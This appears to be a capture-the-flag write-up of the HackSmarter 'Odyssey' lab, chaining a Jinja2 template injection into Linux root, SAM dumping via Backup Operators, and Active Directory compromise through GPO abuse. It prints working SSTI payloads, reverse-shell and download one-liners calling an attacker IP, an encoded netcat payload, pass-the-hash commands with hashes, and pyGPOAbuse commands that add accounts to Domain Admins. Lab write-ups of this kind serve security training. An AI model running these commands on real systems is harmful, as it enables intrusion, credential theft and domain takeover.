# Odyssey

**Difficulty:** Hard  
**Category:** Active Directory, Web Application

## Attack Chain

1. A Jinja2 SSTI on Web-01 achieves RCE, a shell as `ghill_sa`
2. A stolen root SSH key, found in Bash history, roots Web-01
3. The unshadowed root/`ghill_sa` hash is cracked; the password is reused successfully for RDP onto WKST-01
4. Backup Operators membership doesn't grant `SeBackupPrivilege` until re-authenticating with an elevated RDP session
5. `SeBackupPrivilege` is exploited via `reg save` to dump SAM/SYSTEM, recovering `bbarkinson`'s hash
6. `bbarkinson`'s hash grants WinRM access to DC01, where `SeMachineAccountPrivilege` is found
7. A new machine account is joined to the domain, after also fixing a DNS misconfiguration blocking BloodHound elsewhere
8. BloodHound, run from the new machine account, reveals `bbarkinson`'s `GenericWrite` on a GPO
9. `pyGPOAbuse` first tries creating a new Domain Admin, blocked by a username collision and then simply not triggering
10. `pyGPOAbuse` instead adds the existing machine account directly to Domain Admins
11. `secretsdump` recovers the Administrator hash for full domain compromise

Lab context, as described by HackSmarter: Odyssey is modeled on a real engagement where the domain controllers weren't syncing correctly, causing problems throughout, and where a proxy requirement made tools like LDAP hard to use. Standard tooling doesn't always behave as expected here.

## TL;DR

Across three hosts (Web-01, WKST-01, DC01), the entry point was a **Jinja2 Server-Side Template Injection** on Web-01, escalated to remote code execution and a shell as `ghill_sa`, then to full root via a stolen SSH key. Cracking the unshadowed root/ghill_sa password hash produced credentials that were reused successfully for RDP onto WKST-01. There, membership in Backup Operators without an elevated token initially blocked `SeBackupPrivilege` from working, until re-authenticating over RDP with an elevated session unlocked it, enabling a `reg save` dump of SAM/SYSTEM and recovering a hash for `bbarkinson`, an account not seen anywhere in the earlier credential harvest. That hash gave WinRM access to DC01, where `SeMachineAccountPrivilege` allowed joining a new computer to the domain, unlocking BloodHound collection (after also fixing a DNS misconfiguration blocking domain resolution on WKST-01, where the recovered Administrator hash was used to grab the local flag along the way). BloodHound showed `bbarkinson` had `GenericWrite` on a GPO, abused with `pyGPOAbuse` first to try adding a new Domain Admin (blocked by a username collision, then simply not triggering), and finally to add the already-created machine account directly to Domain Admins, which worked and led straight to a DCSync-free Administrator hash via `secretsdump`.

## Full Walkthrough

### Enumeration

Nmap across the three targets:

**Web-01:**

![odyssey screenshot 1](images/odyssey/odyssey-01.png)

**WKST-01:**

![odyssey screenshot 2](images/odyssey/odyssey-02.png)

**DC01:**

![odyssey screenshot 3](images/odyssey/odyssey-03.png)

### Web-01

**HTTP enumeration**, port 5000:

![odyssey screenshot 4](images/odyssey/odyssey-04.png)

![odyssey screenshot 5](images/odyssey/odyssey-05.png)

Checking whether the app can ping the attacking host:

![odyssey screenshot 6](images/odyssey/odyssey-06.png)

![odyssey screenshot 7](images/odyssey/odyssey-07.png)

No response. Directory brute-forcing with Feroxbuster:

![odyssey screenshot 8](images/odyssey/odyssey-08.png)

![odyssey screenshot 9](images/odyssey/odyssey-09.png)

A login page turns up. Trying a classic SQLi-style payload (`'` for username, empty password):

![odyssey screenshot 10](images/odyssey/odyssey-10.png)

Possible SQL injection. Checking with `sqlmap`:

![odyssey screenshot 11](images/odyssey/odyssey-11.png)

![odyssey screenshot 12](images/odyssey/odyssey-12.png)

The parameters aren't actually injectable. **UDP scan**, checking 161:

![odyssey screenshot 13](images/odyssey/odyssey-13.png)

Closed. Moving on.

### WKST-01

**SMB enumeration** with `enum4linux`:

![odyssey screenshot 14](images/odyssey/odyssey-14.png)

![odyssey screenshot 15](images/odyssey/odyssey-15.png)

**UDP scan**, port 161:

![odyssey screenshot 16](images/odyssey/odyssey-16.png)

Filtered, no other ports of interest.

### DC01

**SMB enumeration** with `enum4linux`:

![odyssey screenshot 17](images/odyssey/odyssey-17.png)

![odyssey screenshot 18](images/odyssey/odyssey-18.png)

RPC isn't accessible. `smbclient`:

![odyssey screenshot 19](images/odyssey/odyssey-19.png)

Updating `/etc/hosts`:

![odyssey screenshot 20](images/odyssey/odyssey-20.png)

**Following Orange Cyberdefense's no-creds AD methodology:**

TimeRoasting:

![odyssey screenshot 21](images/odyssey/odyssey-21.png)

Attempting to crack the results:

![odyssey screenshot 22](images/odyssey/odyssey-22.png)

No luck. ASREPRoasting:

![odyssey screenshot 23](images/odyssey/odyssey-23.png)

Also unsuccessful, likely related to the LDAP issues flagged in the lab's own description.

### Access as ghill_sa

Back to Web-01. Since a Python process is running:

![odyssey screenshot 24](images/odyssey/odyssey-24.png)

Worth checking for **Server-Side Template Injection**, following [PayloadsAllTheThings' SSTI methodology](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#methodology):

![odyssey screenshot 25](images/odyssey/odyssey-25.png)

Trying `{7*7}`:

![odyssey screenshot 26](images/odyssey/odyssey-26.png)

And `<%=7*7%>`:

![odyssey screenshot 27](images/odyssey/odyssey-27.png)

**Jinja2 injection**, following the [Django/Jinja2 section of the same guide](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#django-admin-username-and-password-hash-leak):

![odyssey screenshot 28](images/odyssey/odyssey-28.png)

Trying the basic Jinja2 injection, `{{7*'7'}}`:

![odyssey screenshot 29](images/odyssey/odyssey-29.png)

Vulnerable. Trying `{{config.items()}}`:

![odyssey screenshot 30](images/odyssey/odyssey-30.png)

Reading `/etc/passwd`:

![odyssey screenshot 31](images/odyssey/odyssey-31.png)

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

![odyssey screenshot 32](images/odyssey/odyssey-32.png)

The file comes back, listing a user of interest: `ghill_sa`.

**Attempting to write a remote file:**

![odyssey screenshot 33](images/odyssey/odyssey-33.png)

Trying to plant an SSH public key in `ghill_sa`'s `authorized_keys`. Generating a key pair:

![odyssey screenshot 34](images/odyssey/odyssey-34.png)

Setting permissions to 600:

![odyssey screenshot 35](images/odyssey/odyssey-35.png)

Attempting the write:

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/ghill_sa/.ssh/authorized_keys/ghill.pub', 'w').write('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHYcBNtJ69Lcmn6Yehh0XD4Zmm+N/aNGrdiwyLaJjACl zulema@BlackSnake') }}
```

![odyssey screenshot 36](images/odyssey/odyssey-36.png)

Fails, not possible from here.

**Exploiting the SSTI for RCE**, per [PayloadsAllTheThings' Jinja2 RCE section](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2):

![odyssey screenshot 37](images/odyssey/odyssey-37.png)

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![odyssey screenshot 38](images/odyssey/odyssey-38.png)

Command execution confirmed. Trying `ls /`:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}
```

![odyssey screenshot 39](images/odyssey/odyssey-39.png)

Trying a netcat callback:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('nc -c /bin/sh 10.200.74.177 1234').read() }}
```

No output. A Bash reverse shell one-liner also produces no output. Checking `/opt`:

![odyssey screenshot 40](images/odyssey/odyssey-40.png)

`/opt/odyssey`:

![odyssey screenshot 41](images/odyssey/odyssey-41.png)

A `startup.sh` file, possibly cron-triggered. Reading it:

![odyssey screenshot 42](images/odyssey/odyssey-42.png)

If it can be modified, it might get triggered automatically. Appending a reverse shell:

```
echo 'bash -i >& /dev/tcp/10.200.74.177/1234 0>&1' >> /opt/odyssey/startup.sh
```

![odyssey screenshot 43](images/odyssey/odyssey-43.png)

Reading it back to confirm:

![odyssey screenshot 44](images/odyssey/odyssey-44.png)

Confirmed written. Rewriting it as a proper script with a shebang and newline, just in case formatting is the issue:

```
echo "#!/bin/bash \nbash -i >& /dev/tcp/10.200.74.177/1234 0>&1" > /opt/odyssey/startup.sh
```

Still no callback. Trying a different approach: writing a proper script locally and transferring it directly instead of echoing it remotely.

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('wget http://10.200.74.177/startup.sh -O /opt/odyssey/startup.sh').read() }}
```

![odyssey screenshot 45](images/odyssey/odyssey-45.png)

![odyssey screenshot 46](images/odyssey/odyssey-46.png)

![odyssey screenshot 47](images/odyssey/odyssey-47.png)

Making it executable with `chmod +x`, and inspecting `App.py` for more context:

![odyssey screenshot 48](images/odyssey/odyssey-48.png)

Still no callback, potentially an outbound/inbound firewall restriction. Trying a Penelope payload (netcat plus a named pipe) instead:

```
printf KHJtIC90bXAvXztta2ZpZm8gL3RtcC9fO2NhdCAvdG1wL198c2ggMj4mMXxuYyAxMC4yMDAuNzQuMTc3IDgwID4vdG1wL18pID4vZGV2L251bGwgMj4mMSAm|base64 -d|sh
```

![odyssey screenshot 49](images/odyssey/odyssey-49.png)

![odyssey screenshot 50](images/odyssey/odyssey-50.png)

Initial access confirmed as `ghill_sa`.

**Enumeration:** SUID binaries:

![odyssey screenshot 51](images/odyssey/odyssey-51.png)

Capabilities:

![odyssey screenshot 52](images/odyssey/odyssey-52.png)

Internal ports:

![odyssey screenshot 53](images/odyssey/odyssey-53.png)

Running LinPEAS:

![odyssey screenshot 54](images/odyssey/odyssey-54.png)

![odyssey screenshot 55](images/odyssey/odyssey-55.png)

Confirms a Docker environment. Checking Bash history turns up something interesting:

![odyssey screenshot 56](images/odyssey/odyssey-56.png)

Checking referenced key files:

![odyssey screenshot 57](images/odyssey/odyssey-57.png)

A private/public key pair. Worth checking whether the private key has a crackable passphrase reusable elsewhere. Downloading it and running `ssh2john`:

![odyssey screenshot 58](images/odyssey/odyssey-58.png)

![odyssey screenshot 59](images/odyssey/odyssey-59.png)

Checking what kind of key it actually is, possibly root's:

![odyssey screenshot 60](images/odyssey/odyssey-60.png)

Confirmed, root's key.

### Web-01 Pwned

Reading `/etc/shadow`:

![odyssey screenshot 61](images/odyssey/odyssey-61.png)

Attempting to crack it directly:

![odyssey screenshot 62](images/odyssey/odyssey-62.png)

![odyssey screenshot 63](images/odyssey/odyssey-63.png)

![odyssey screenshot 64](images/odyssey/odyssey-64.png)

Going to take too long this way. Unshadowing first instead, combining `/etc/passwd` and `/etc/shadow`:

![odyssey screenshot 65](images/odyssey/odyssey-65.png)

Copying both files and running `unshadow`:

![odyssey screenshot 66](images/odyssey/odyssey-66.png)

![odyssey screenshot 67](images/odyssey/odyssey-67.png)

Unshadowed hashes recovered:

![odyssey screenshot 68](images/odyssey/odyssey-68.png)

Root and `ghill_sa` are likely sharing the same password, worth cracking together.

**Cracking:**

![odyssey screenshot 69](images/odyssey/odyssey-69.png)

Also a long-running crack. Waiting it out:

![odyssey screenshot 70](images/odyssey/odyssey-70.png)

Password cracked:

```
P@ssw0rd!
```

Worth testing for reuse on the other hosts.

**Password reuse:** trying the same credentials for `ghill_sa` against WKST-01 with CrackMapExec:

![odyssey screenshot 71](images/odyssey/odyssey-71.png)

Blocked by the LDAP issues affecting this environment. Trying RDP instead:

![odyssey screenshot 72](images/odyssey/odyssey-72.png)

Works.

### Enumeration on WKST-01

`tree /f`:

![odyssey screenshot 73](images/odyssey/odyssey-73.png)

Nothing in the `/ghill` directory.

![odyssey screenshot 74](images/odyssey/odyssey-74.png)

`/Share/DeptDocs` holds a large number of documents. Checking through them:

![odyssey screenshot 75](images/odyssey/odyssey-75.png)

![odyssey screenshot 76](images/odyssey/odyssey-76.png)

![odyssey screenshot 77](images/odyssey/odyssey-77.png)

![odyssey screenshot 78](images/odyssey/odyssey-78.png)

![odyssey screenshot 79](images/odyssey/odyssey-79.png)

![odyssey screenshot 80](images/odyssey/odyssey-80.png)

![odyssey screenshot 81](images/odyssey/odyssey-81.png)

![odyssey screenshot 82](images/odyssey/odyssey-82.png)

![odyssey screenshot 83](images/odyssey/odyssey-83.png)

![odyssey screenshot 84](images/odyssey/odyssey-84.png)

![odyssey screenshot 85](images/odyssey/odyssey-85.png)

![odyssey screenshot 86](images/odyssey/odyssey-86.png)

![odyssey screenshot 87](images/odyssey/odyssey-87.png)

![odyssey screenshot 88](images/odyssey/odyssey-88.png)

![odyssey screenshot 89](images/odyssey/odyssey-89.png)

![odyssey screenshot 90](images/odyssey/odyssey-90.png)

![odyssey screenshot 91](images/odyssey/odyssey-91.png)

A huge number of credentials turn up here, likely a red herring rather than the intended path forward, testing each individually would be impractical. `net users`:

![odyssey screenshot 92](images/odyssey/odyssey-92.png)

A user list comes back. Internal ports:

![odyssey screenshot 93](images/odyssey/odyssey-93.png)

No databases. PowerShell history is empty. BloodHound collection from inside doesn't work, likely blocked by AV. Checking processes:

![odyssey screenshot 94](images/odyssey/odyssey-94.png)

Nothing interesting. PowerView doesn't run either. `whoami /all`:

![odyssey screenshot 95](images/odyssey/odyssey-95.png)

Part of Backup Operators, but `SeBackupPrivilege` isn't listed as enabled yet. Checking whether SAM/SYSTEM are readable:

![odyssey screenshot 96](images/odyssey/odyssey-96.png)

No access to `\windows\system32\config`. Per [HackTricks' privileged groups and token privileges guide](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html): Backup Operators membership grants access to the DC's file system through the `SeBackup`/`SeRestore` privileges, enabling folder traversal, listing, and copying, even without explicit permissions, via the `FILE_FLAG_BACKUP_SEMANTICS` flag, though specific scripts are needed to exercise it. For domain-wide impact, a DiskShadow attack can steal `NTDS.dit`, containing every domain hash.

**DiskShadow attack:** confirming `diskshadow` is present:

![odyssey screenshot 97](images/odyssey/odyssey-97.png)

It is. Attempting a shadow copy of the C: drive:

```
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

![odyssey screenshot 98](images/odyssey/odyssey-98.png)

Blocked by insufficient privileges. Trying a local attack instead, using the [SeBackupPrivilege DLLs](https://github.com/giuliano108/SeBackupPrivilege):

![odyssey screenshot 99](images/odyssey/odyssey-99.png)

Transferring and following the linked instructions:

![odyssey screenshot 100](images/odyssey/odyssey-100.png)

Still not behaving as expected. Trying a different reference, [Domain Privilege Escalation via the Backup Operators group](https://r00tven0m.github.io/posts/Domain-Privilege-Escalation-Backup-Operators-Group/), using `reg`:

![odyssey screenshot 101](images/odyssey/odyssey-101.png)

Still not working. Trying Impacket's `reg.py` instead: starting an SMB server with `-smb2support`:

![odyssey screenshot 102](images/odyssey/odyssey-102.png)

Running `impacket-reg` with the backup flag and `-o` to write into the share:

```
impacket-reg hsm.local/ghill_sa:"P@ssw0rd\!"@10.1.229.213 backup -o \\10.200.74.177\hello
```

![odyssey screenshot 103](images/odyssey/odyssey-103.png)

A logon error. Dropping the domain and using just `/ghill_sa`:

![odyssey screenshot 104](images/odyssey/odyssey-104.png)

Path not found this time. Membership in Backup Operators alone hasn't actually activated the associated privileges in this session, they simply aren't set. After reviewing several other public writeups of this same lab (all of which show `SeBackupPrivilege` present), something specific to this session looks off. Resetting the RDP session doesn't change anything at first. Checking for local admin rights instead, with `netexec rdp`:

```
netexec rdp 10.1.244.180 -u ghill_sa -p P@ssw0rd! --local-auth
```

![odyssey screenshot 105](images/odyssey/odyssey-105.png)

Local admin rights are confirmed. Opening PowerShell with elevated privileges and re-checking:

![odyssey screenshot 106](images/odyssey/odyssey-106.png)

With an elevated session, the expected privileges are finally present.

### Access as bbarkinson

**Exploiting SeBackupPrivilege** with `reg save`:

![odyssey screenshot 107](images/odyssey/odyssey-107.png)

Opening an SMB server with `impacket-smbserver` and transferring the saved hives:

![odyssey screenshot 108](images/odyssey/odyssey-108.png)

That transfer path doesn't work, but the RDP session has a mapped drive available, moving the files through it directly instead:

![odyssey screenshot 109](images/odyssey/odyssey-109.png)

Running `impacket-secretsdump LOCAL -sam -system`:

![odyssey screenshot 110](images/odyssey/odyssey-110.png)

Hashes recovered.

![odyssey screenshot 111](images/odyssey/odyssey-111.png)

`bbarkinson` is a user that never appeared in any of the earlier document-based credential harvest. Using it to authenticate to DC01 over WinRM:

![odyssey screenshot 112](images/odyssey/odyssey-112.png)

Access confirmed. Enumerating: `whoami /all`:

![odyssey screenshot 113](images/odyssey/odyssey-113.png)

`SeMachineAccountPrivilege` is set. `tree /f`:

![odyssey screenshot 114](images/odyssey/odyssey-114.png)

Nothing. PowerShell history:

![odyssey screenshot 115](images/odyssey/odyssey-115.png)

Nothing. `/Users`:

![odyssey screenshot 116](images/odyssey/odyssey-116.png)

`C:\`:

![odyssey screenshot 117](images/odyssey/odyssey-117.png)

An `ldaps.cer` file, likely a certificate for LDAPS:

![odyssey screenshot 118](images/odyssey/odyssey-118.png)

Checking group memberships:

![odyssey screenshot 119](images/odyssey/odyssey-119.png)

`bbarkinson` is a member of "Pre-Windows 2000 Compatible Access", a legacy AD group that grants read access to all user and group objects in the domain, originally for backward compatibility with older systems, and often broad enough that any domain user can see private account details through it.

### Detour: Getting the WKST-01 Flag

Circling back, the WKST-01 flag was never actually grabbed. Since the local Administrator hash is already available, resetting its password and RDPing in is straightforward:

```
nxc smb 10.1.244.180 -u "Administrator" -H "d5cad8a9782b2879bf316f56936f1e36" --local-auth -x 'net user Administrator password123!'
```

![odyssey screenshot 120](images/odyssey/odyssey-120.png)

Retrying via WMI as suggested by the tool's output:

![odyssey screenshot 121](images/odyssey/odyssey-121.png)

That works. RDP in and grab the flag:

![odyssey screenshot 122](images/odyssey/odyssey-122.png)

**BloodHound attempt:** with Administrator access, disabling AV and trying BloodHound collection:

![odyssey screenshot 123](images/odyssey/odyssey-123.png)

![odyssey screenshot 124](images/odyssey/odyssey-124.png)

Running SharpHound via `Invoke-Bloodhound`:

![odyssey screenshot 125](images/odyssey/odyssey-125.png)

Possibly a DNS issue. Pinging the domain:

![odyssey screenshot 126](images/odyssey/odyssey-126.png)

Fails. Changing the DNS server to point at DC01 (Network & Internet > Ethernet > IPv4 DNS Servers > Manual):

![odyssey screenshot 127](images/odyssey/odyssey-127.png)

Pinging again:

![odyssey screenshot 128](images/odyssey/odyssey-128.png)

Resolves now. Running BloodHound again:

![odyssey screenshot 129](images/odyssey/odyssey-129.png)

Still nothing from this angle. Time to change approach and go back to the `bbarkinson` foothold.

![odyssey screenshot 130](images/odyssey/odyssey-130.png)

`SeMachineAccountPrivilege` is set for this account, worth trying to join a new workstation to the domain to run BloodHound from an authenticated machine context instead.

### Adding and Joining a Machine to AD

Checking the machine account quota (the number of computers an account with `SeMachineAccountPrivilege` can join) with `nxc ldap -M maq`:

![odyssey screenshot 131](images/odyssey/odyssey-131.png)

Up to 10 machines allowed. Adding one with `impacket-addcomputer`:

![odyssey screenshot 132](images/odyssey/odyssey-132.png)

Doesn't work. Trying BloodyAD instead:

```
bloodyad --dc-ip 10.1.90.151 -d hsm.local -u bbarkinson -p :53c3709ae3d9f4428a230db81361ffbc --host DC01.hsm.local add computer ZULEMA zulema123!
```

![odyssey screenshot 133](images/odyssey/odyssey-133.png)

![odyssey screenshot 134](images/odyssey/odyssey-134.png)

Computer added successfully.

**BloodHound, retried:** running collection with the new machine account's credentials:

```
Invoke-Bloodhound -collectionmethods all -ldapusername ZULEMA$ -ldappassword zulema123! -domaincontroller "dc01.hsm.local" -d hsm.local
```

![odyssey screenshot 135](images/odyssey/odyssey-135.png)

Collection succeeds this time.

### Full Domain Compromise

Analyzing the results:

![odyssey screenshot 136](images/odyssey/odyssey-136.png)

`bbarkinson` holds `GenericWrite` on the Finance Policy GPO. Checking how to abuse it:

![odyssey screenshot 137](images/odyssey/odyssey-137.png)

**Abusing the GPO** with [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse), which can push a scheduled task that adds a new domain user and promotes them to Domain Admins:

```
python3 pygpoabuse.py red.local/user:Testing123 -gpo-id D9A65E7F-112D-49B9-AF7A-4FC2BA092BF6 -taskname SecurityUpdate -dc-ip 192.168.152.2 -command 'net user UserGPO P@ssw0rd /add && net group "Domain Admins" UserGPO /add' -filter-enabled -target-dns-name dc01.red.local
```

The GPO ID for this environment:

![odyssey screenshot 138](images/odyssey/odyssey-138.png)

```
python3 pygpoabuse.py hsm.local/bbarkinson -hashes :53c3709ae3d9f4428a230db81361ffbc -gpo-id 526CDF3A-10B6-4B00-BCFA-36E59DCD71A2 -taskname SecurityUpdate -dc-ip 10.1.90.151 -command 'net user zulema zulema123! /add && net group "Domain Admins" zulema /add' -filter-enabled -target-dns-name DC01.HSM.LOCAL
```

![odyssey screenshot 139](images/odyssey/odyssey-139.png)

Scheduled task created. Waiting for it to trigger, checking periodically with `nxc ldap`:

```
nxc ldap dc01 -u zulema -p zulema123!
```

![odyssey screenshot 140](images/odyssey/odyssey-140.png)

No result after a wait. Checking the tool's basic usage for anything missed:

![odyssey screenshot 141](images/odyssey/odyssey-141.png)

There's already a user named `John` in the domain, a likely naming collision with the exploit's default. Patching the exploit's `scheduledtask.py` to use `John1` instead:

![odyssey screenshot 142](images/odyssey/odyssey-142.png)

![odyssey screenshot 143](images/odyssey/odyssey-143.png)

Using `-f` to append the task rather than replace the previous one, and `-v` to display tasks. Still no output after another wait.

A simpler target: `ZULEMA$`, the machine account created earlier, already exists, so rather than creating a new user, adding that existing account directly to Domain Admins should work:

```
python3 pygpoabuse.py hsm.local/bbarkinson -hashes :53c3709ae3d9f4428a230db81361ffbc -gpo-id 526CDF3A-10B6-4B00-BCFA-36E59DCD71A2 -taskname SecurityUpdate -dc-ip 10.1.90.151 -command 'net group "Domain Admins" ZULEMA$ /add' -filter-enabled -target-dns-name DC01.HSM.LOCAL -f
```

![odyssey screenshot 144](images/odyssey/odyssey-144.png)

![odyssey screenshot 145](images/odyssey/odyssey-145.png)

Still no confirmation output. Trying instead to add `ZULEMA$` to the local Administrators group:

![odyssey screenshot 146](images/odyssey/odyssey-146.png)

Running `impacket-secretsdump`:

![odyssey screenshot 147](images/odyssey/odyssey-147.png)

![odyssey screenshot 148](images/odyssey/odyssey-148.png)

The Administrator hash comes back. WinRM:

![odyssey screenshot 149](images/odyssey/odyssey-149.png)

Full domain compromise.

---

*Educational write-up from an authorized lab environment (HackSmarter). Not a guide for unauthorized access.*
